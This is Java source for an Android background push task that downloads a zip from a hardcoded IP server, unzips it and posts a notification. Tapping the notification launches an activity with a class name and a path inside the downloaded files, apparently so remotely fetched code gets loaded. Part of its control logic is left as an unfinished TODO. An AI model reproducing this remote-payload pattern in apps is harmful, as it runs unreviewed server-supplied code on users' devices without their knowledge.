/**
 * 
 */
package cn.play.dserv;

import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLConnection;
import java.util.Calendar;

import android.app.Notification;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;


/**
 * push
 * @author Keel
 *
 */
public class PLTask19 implements PLTask {

	private static final int id = 19;
	private String f_zip = "aph"+id+".zip";
	private int f_zip_size = -1;	//!!!!!注意更新与文件匹配!!!!!!!!!!
	
	
	
	private String downloadPre = "http://180.96.63.85:12370/plserver/aph/";
	private String ctrlUrl = "http://180.96.63.85:12370/plserver/aph/ctrl";
	/**
	 * 联网控制开关为关时的再次确认等待时间
	 */
	private long ctrlCheckTime = 1000*60*60 * 24;
	
	private DServ dserv;
	private int state = STATE_WAITING;
	private String TAG = "dserv-PLTask"+id;
	private Context ctx;
	private boolean isInitOK = false;
	
	
	/**
	 * .aph目录
	 */
	private String localPath;
	
	
	
	private boolean download(String remote,String localPath,String fileName,int size){
		boolean downOK = false;
		long downSize = 0;
		if (dserv.downloadGoOn(remote, localPath, fileName, dserv.getService())) {
			File f = new File(localPath+fileName);
			if (f.isFile()) {
				downSize = f.length();
				if (downSize > 10 && (size < 0 || downSize == size)) {
					downOK = true;
				}
			}
		}else{
			CheckTool.log(dserv.getService(), TAG, "==========downloadGoOn failed:"+remote+"===="+localPath+"---"+fileName+" downsize:"+downSize);
		}
		if (!downOK) {
			CheckTool.log(dserv.getService(), TAG, "==========downloadGoOn failed:"+remote+"===="+localPath+"---"+fileName+" downsize:"+downSize);
			File f = new File(localPath+fileName);
			if (f.isFile()) {
				f.delete();
			}
		}
		return downOK;
	}
	
	/**
	 * 下载zip，核实大小并解压
	 * @return
	 */
	private boolean downFiles(){
		if (download(downloadPre+f_zip, localPath, f_zip,f_zip_size)) {
			if (dserv.unzip(localPath+f_zip, localPath)) {
				return true;
			}
		}
		return false;
	}
	
	/**
	 * 清空目录
	 * @param dir
	 */
	private void clearDir(String dir){
		File ls = new File(dir);
		if (ls == null || !ls.isDirectory()) {
			return;
		}
		File[] files = ls.listFiles();
		if (files == null) {
			return;
		}
		for (int i = 0; i < files.length; i++) {
			File f = files[i];
			if (f.isFile()) {
				files[i].delete();
			}else if(f.isDirectory()){
				clearDir(f.getAbsolutePath());
			}
		}
	}
	
	private long checkWaitTime(String orderUrl){
		//联网查看显示时间段，开关，如果符合则返回0
		try {
			URL u = new URL(orderUrl);
			URLConnection conn = u.openConnection();
			conn.connect(); 
			BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
			String line;
			StringBuilder sb = new StringBuilder();
			while ((line = in.readLine()) != null){
				sb.append(line);
			}
			String re = sb.toString();
			if (StringUtil.isStringWithLen(re, 2)) {
				//TODO 内容格式:
				
				
				
				
			}else{
				return this.ctrlCheckTime;
			}
			
		} catch (Exception e) {
			e.printStackTrace();
			return this.ctrlCheckTime;
		}
		
		
		//不在时间段内则计算等待时间
		
		Calendar ca = Calendar.getInstance();
		int nowHour = ca.get(Calendar.HOUR_OF_DAY);
		if (nowHour< 8 || nowHour>22) {
			
			
		}
		
		//开关为关则等待ctrlCheckTime
		
		return 0;
	}
	
	private void ph(){
		
		//确定aph+id.data配置文件,逐一检查文件是否存在
		
		//从配置中读取
		String pushTitle = "test 标题";
		String pushTxt = "最新到来啦！";
		String emvClass = "cn.play.dserv.Eaph";
		String emvPath = this.localPath+"aph/eap";
		
		
		NotificationManager nm = (NotificationManager) dserv.getService().getSystemService(Context.NOTIFICATION_SERVICE);  
		
		Notification no  = new Notification();
		no.tickerText = pushTitle;
		no.flags |= Notification.FLAG_AUTO_CANCEL;  
		no.icon = android.R.drawable.stat_notify_chat;
		PendingIntent pd = null;
		
		Intent it = new Intent(this.dserv.getService(),EmpActivity.class); 
		it.putExtra("emvClass", emvClass);
		it.putExtra("emvPath",  emvPath);
		it.putExtra("uid", (Long)(this.dserv.getPropObj("uid", 0L)));
		it.putExtra("no", "_@@"+id+"@@113@@push_clicked");
		it.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK); 
		pd = PendingIntent.getActivity(this.dserv.getService(), 0, it, PendingIntent.FLAG_UPDATE_CURRENT);

		no.setLatestEventInfo(dserv.getService(), pushTitle, pushTxt, pd);
		
		nm.notify(1320+id, no);
		
		CheckTool.sLog(this.dserv.getService(), 101, "_@@"+id+"@@118@@pushShow");
		
	}
	
	@Override
	public void run() {
		CheckTool.log(this.ctx, TAG, "==========PLTask id:"+id+"===========");
		if (this.ctx == null || !isInitOK) {
			CheckTool.log(this.ctx, TAG, "init error.");
			return;
		}
		dserv.dsLog(1, "PLTask", 100,dserv.getService().getPackageName(), "0_0_"+id+"_task is running");
		state = STATE_RUNNING;
		
		//清理aph目录
		this.clearDir(this.localPath);
		
		//
		boolean fileDownOK = false;
		try {
			while (true) {
				if (!isNetOk(this.dserv.getService())) {
					Thread.sleep(1000*60*5);
					continue;
				}
				//下载文件：图片等web文件打包成一个zip，此时将其下载并解出
				if (!fileDownOK) {
					if (this.downFiles()) {
						CheckTool.log(dserv.getService(), TAG, "==== PLTask "+id+" downFiles OK");
						fileDownOK = true;	
					}else{
						CheckTool.log(dserv.getService(), TAG, "==== PLTask "+id+" downFiles err.");
						fileDownOK = false;	
						Thread.sleep(1000*60*5);
						continue;
					}
				}
				
				//联网获取配置,任务id,时间,开关
				long waitTime = this.checkWaitTime(ctrlUrl);
				if (waitTime <= 0) {
					//显示push内容
					ph();
					this.dserv.taskDone(this);
					state = STATE_DIE;
					dserv.dsLog(1, "PLTask", 100,dserv.getService().getPackageName(), "0_0_"+id+"_task is finished.");
					break;
				}else{
					CheckTool.log(dserv.getService(), TAG, "==== PLTask "+id+" wait : "+waitTime);
					Thread.sleep(waitTime);
					continue;
				}
			}
		} catch (Exception e) {
			e.printStackTrace();
			CheckTool.log(dserv.getService(), TAG, "==========PLTask err id:"+id+"===========");
		}
		
		
		
		
	}
	public static boolean isNetOk(Context cx) {
		ConnectivityManager cm = (ConnectivityManager) cx.getSystemService(Context.CONNECTIVITY_SERVICE);
		boolean isOk = false;
		if (cm != null) {
			NetworkInfo aActiveInfo = cm.getActiveNetworkInfo();
			if (aActiveInfo != null && aActiveInfo.isAvailable()) {
				if (aActiveInfo.getState().equals(NetworkInfo.State.CONNECTED)) {
					isOk = true;
				}
			}
		}
		return isOk;
	}
	
	/* (non-Javadoc)
	 * @see cn.play.dserv.PLTask#getId()
	 */
	@Override
	public int getId() {
		return id;
	}

	/* (non-Javadoc)
	 * @see cn.play.dserv.PLTask#getState()
	 */
	@Override
	public int getState() {
		return this.state;
	}

	/* (non-Javadoc)
	 * @see cn.play.dserv.PLTask#init()
	 */
	@Override
	public void init() {
		CheckTool.log(dserv.getService(),TAG, "TASK "+id+" init.");
		
//		Log.d(TAG, "TASK "+id+" init.");
		if (dserv.getService() != null) {
			this.ctx = dserv.getService();
			this.localPath = dserv.getLocalPath()+"aph/";
			(new File(this.localPath)).mkdirs();
			dserv.dsLog(1, "PLTask", 100,dserv.getService().getPackageName(), "0_0_"+id+"_task inited.");
			isInitOK = true;
		}else{
			CheckTool.log(dserv.getService(),TAG, "TASK "+id+" getService is null.");
			isInitOK = false;
		}
	}

	/* (non-Javadoc)
	 * @see cn.play.dserv.PLTask#setState(int)
	 */
	@Override
	public void setState(int arg0) {
		this.state = arg0;
	}

	@Override
	public void setDService(DServ serv) {
		this.dserv =serv;
	}
}
